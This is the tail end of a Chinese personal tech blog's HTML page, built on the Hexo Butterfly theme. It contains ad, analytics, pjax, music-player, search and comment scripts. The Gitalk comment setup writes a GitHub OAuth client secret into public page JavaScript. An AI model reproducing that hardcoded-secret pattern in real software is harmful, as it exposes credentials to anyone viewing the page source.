href="/2024/08/23/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E5%87%BA%E7%8E%B0RPC%20failed%20HTTP%20400%E7%9A%84%E9%97%AE%E9%A2%98/" title="解决git提交出现RPC failed HTTP 400的问题">解决git提交出现RPC failed HTTP 400的问题</a><time datetime="2024-08-23T03:36:56.000Z" title="发表于 2024-08-23 11:36:56">2024-08-23</time></div></div></div></div><div class="card-widget ads-wrap"><script async crossorigin=anonymous src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8999136091629669"></script><ins class=adsbygoogle data-ad-client=ca-pub-8999136091629669 data-ad-format=auto data-ad-slot=7049722255 data-full-width-responsive=true style=display:block></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div></div></main><footer id="footer" style="background-image: url('/img/home-bg.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2024 By YSY</div><div class="footer_custom_text">Welcome To My Blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'a2660cd0497b67ee33e5',
      clientSecret: '3f970ce5c5ee2b57bed7c20e44809ba6bda487ac',
      repo: 'ysy950803.github.io',
      owner: 'ysy950803',
      admin: ['ysy950803'],
      id: '645ff06258d7eb1fb8e3393a9a7972cd',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.textContent= n
  }
}

if ('Gitalk' === 'Gitalk' || !true) {
  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><div class="aplayer no-destroy" data-id="2829816518" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="false" data-lrctype="0"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'UA-149830607-1', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>